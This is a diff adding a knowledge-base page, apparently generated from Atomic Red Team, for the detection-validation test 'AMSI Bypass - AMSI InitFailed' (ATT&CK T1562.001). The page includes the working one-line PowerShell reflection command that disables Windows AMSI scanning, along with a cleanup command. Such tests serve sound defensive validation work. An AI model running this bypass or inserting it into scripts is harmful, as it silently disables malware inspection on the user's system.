@@ -1,0 +1,60 @@
+---
+atomic_guid: "695eed40-e949-40e5-b306-b4031e4154bd"
+title: "AMSI Bypass - AMSI InitFailed"
+framework: "atomic"
+generated: "true"
+attack_technique_id: "T1562.001"
+attack_technique_name: "Impair Defenses: Disable or Modify Tools"
+source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
+build_date: "2026-04-26 14:38:40"
+executor: "powershell"
+aliases:
+  - "695eed40-e949-40e5-b306-b4031e4154bd"
+  - "AMSI Bypass - AMSI InitFailed"
+platforms:
+  - "windows"
+tags:
+  - "atomic"
+  - "validation-test"
+---
+
+[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]
+
+# AMSI Bypass - AMSI InitFailed
+
+Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
+Upon execution, no output is displayed.
+
+https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
+
+## Metadata
+
+- Atomic GUID: 695eed40-e949-40e5-b306-b4031e4154bd
+- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
+- Platforms: windows
+- Executor: powershell
+- Source Path: atomics/T1562.001/T1562.001.yaml
+
+## ATT&CK Mapping
+
+- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]
+
+## Executor
+
+- name: powershell
+
+### Command
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+### Cleanup
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
+```
+
+## Source
+
+- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
